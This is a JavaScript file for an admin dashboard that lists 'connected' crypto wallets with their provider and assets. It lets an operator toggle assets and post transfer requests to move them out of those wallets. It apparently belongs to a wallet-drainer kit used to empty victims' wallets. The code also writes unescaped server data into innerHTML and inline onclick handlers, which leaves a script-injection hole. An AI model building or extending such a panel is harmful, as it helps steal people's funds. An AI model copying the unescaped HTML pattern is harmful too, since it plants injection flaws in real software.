let toggledTransfers = {};

function toggleAsset(address, asset, el) {
  el.classList.toggle('active');
  toggledTransfers[address] = toggledTransfers[address] || [];
  if (el.classList.contains('active')) {
    toggledTransfers[address].push(asset);
  } else {
    toggledTransfers[address] = toggledTransfers[address].filter(a => a !== asset);
  }
}

function loadWallets() {
  console.log("📡 Loading wallets...");
  fetch('/api/wallets')
    .then(res => res.json())
    .then(data => {
      const table = document.getElementById('walletTableBody');
      table.innerHTML = '';
      if (!data.length) {
        table.innerHTML = '<tr><td colspan="3">No wallets connected yet.</td></tr>';
        return;
      }

      data.forEach(wallet => {
        const row = document.createElement('tr');
        const assetToggles = (wallet.assets || []).map(asset => {
          return `<span class="toggle-btn" onclick="toggleAsset('${wallet.address}', '${asset}', this)">${asset}</span>`;
        }).join(' ');

        row.innerHTML = `
          <td>${wallet.address}</td>
          <td>${wallet.provider}</td>
          <td>${assetToggles || 'None'}</td>
        `;
        table.appendChild(row);
      });
    })
    .catch(err => {
      console.error("❌ Failed to load wallets:", err);
    });
}

document.addEventListener('DOMContentLoaded', () => {
  loadWallets();

  document.getElementById('transferBtn')?.addEventListener('click', () => {
    Object.entries(toggledTransfers).forEach(([address, assets]) => {
      assets.forEach(asset => {
        fetch('/api/transfer', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ address, asset })
        })
        .then(res => res.json())
        .then(res => alert(`✅ ${asset} from ${address} transfer triggered.`))
        .catch(err => alert(`❌ Failed to transfer ${asset} from ${address}`));
      });
    });
  });

  document.getElementById('logoutBtn')?.addEventListener('click', () => {
    window.location.href = 'admin-login.html';
  });
});
